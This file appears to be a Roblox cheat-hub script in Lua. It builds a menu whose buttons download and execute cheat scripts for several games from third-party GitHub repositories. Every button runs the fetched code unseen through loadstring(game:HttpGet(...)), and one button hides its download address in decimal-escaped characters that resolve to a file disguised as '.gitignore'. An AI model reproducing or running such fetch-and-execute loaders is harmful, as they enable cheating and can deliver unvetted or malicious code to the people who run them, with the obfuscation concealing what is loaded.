local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()

local win = DiscordLib:Window("Frozen Hub")

local serv = win:Server("Main", "http://www.roblox.com/asset/?id=6031075938")

local astd = serv:Channel("All Star")

astd:Button("Karma Panda", function()
DiscordLib:Notification("Notification", "Success!", "Okay!")
print(loadstring(game:HttpGet('https://raw.githubusercontent.com/KarmaPanda/Roblox/main/astd-aio.lua'))())
end)

astd:Seperator()

astd:Button("IDK", function()
DiscordLib:Notification("Notification", "Success!", "Okay!")
print(loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperOuro/Lua-Scripts/main/all_star_tower_defense.lua"))())
end)

local an = serv:Channel("Arsenal")

an:Button("V.G. Hub", function()
DiscordLib:Notification("Notification", "Success!", "Okay!")
print(loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))())
end)

an:Seperator()

an:Button("Dark Hub", function()
DiscordLib:Notification("Notification", "Success!", "Okay!")
print(loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))())
end)

local cb = serv:Channel("Counter Blox")

cb:Button("Dark Hub", function()
DiscordLib:Notification("Notification", "Success!", "Okay!")
print(loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))())
end)

cb:Seperator()

cb:Button("IDK", function()
DiscordLib:Notification("Notification", "Success!", "Okay!")
print(loadstring(game:HttpGet('https://raw.githubusercontent.com/venosu/Hex-Hub/main/hexhub.lua'))())
end)
    
local dh = serv:Channel("Da Hood")

dh:Button("IDK", function()
DiscordLib:Notification("Notification", "Success!","Okay!")
print(loadstring(game:HttpGet("https://raw.githubusercontent.com/nighter132/Faded/main/YesEpic", true))())
end)

dh:Seperator()

dh:Button("IDK", function()
DiscordLib:Notification("Notification", "Success!","Okay!")
print(loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\86\97\110\105\115\50\53\50\47\118\97\108\105\97\110\116\47\109\97\105\110\47\46\103\105\116\105\103\110\111\114\101\34\41\44\32\116\114\117\101\41\41\40\41\10")())
end)

local bnds = serv:Channel("KeyBinds")

bnds:Bind("Key bind", Enum.KeyCode.RightControl, function()
Library:ToggleUI()
end)

local cred = serv:Channel("Credit")

cred:Button("Copy Discord Server",function()
setclipboard("https://discord.gg/e54pdXBH2B")
end) 
    
cred:Label("SCRIPT BY ! K1NM4#0001")

cred:Label("GUI BY dawid#7205")
